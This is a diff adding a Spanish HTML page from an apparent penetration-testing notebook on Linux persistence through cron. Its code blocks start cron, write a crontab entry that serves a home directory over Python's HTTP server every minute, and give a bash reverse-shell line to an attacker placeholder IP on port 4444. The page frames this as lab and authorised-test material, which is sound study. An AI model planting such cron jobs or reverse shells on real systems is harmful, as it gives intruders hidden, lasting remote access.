@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Cron | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="cron">
+          <div class="note-tabbar">
+            <span>Cron</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Linux/Persistencia</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / linux / persistencia</p>
+            <h2>Cron</h2>
+
+            <p>Cron permite programar tareas periódicas y puede utilizarse como persistencia en laboratorio. En sistemas reales es una modificación sensible y debe limpiarse al terminar la prueba autorizada.</p>
+
+            <section class="code-card">
+              <h3>Comprobar si cron está activo</h3>
+              <pre><code># Si Cron está corriendo podemos crear una tarea para ganar persistencia
+
+# Comprobar
+ps -eaf
+# Si no está habilitado y tenemos permisos lo habilitamos
+sudo systemctl start cron
+
+# Podemos ver también las tareas cron en la ruta:
+cat /etc/cron*</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Bash target: Crear tarea cron</h3>
+              <pre><code># Nos creamos un archivo para ejecutarlo como cron en el que cada minuto se dirige a ese directorio y abre un servidor python para poder acceder y leer lo que haya
+echo &quot;* * * * * cd /home/student/ &amp;&amp; python -m SimpleHTTPServer&quot; &gt; cron
+# Crear la tarea
+crontab cron
+# Comprueba que se haya subido
+crontab -l
+
+# Para una reverse shell:
+echo &quot;* * * * * bash -i &gt;&amp; /dev/tcp/&lt;ip_kali&gt;/4444 0&gt;&amp;1&quot; &gt; cron</code></pre>
+            </section>
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/linux-cron-persistence.png" alt="Persistencia mediante cron en Linux" />
+            </figure>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>linux</span>
+              <span>post_explotacion</span>
+              <span>persistencia</span>
+              <span>cron</span>
+              <span>crontab</span>
+              <span>reverse_shell</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
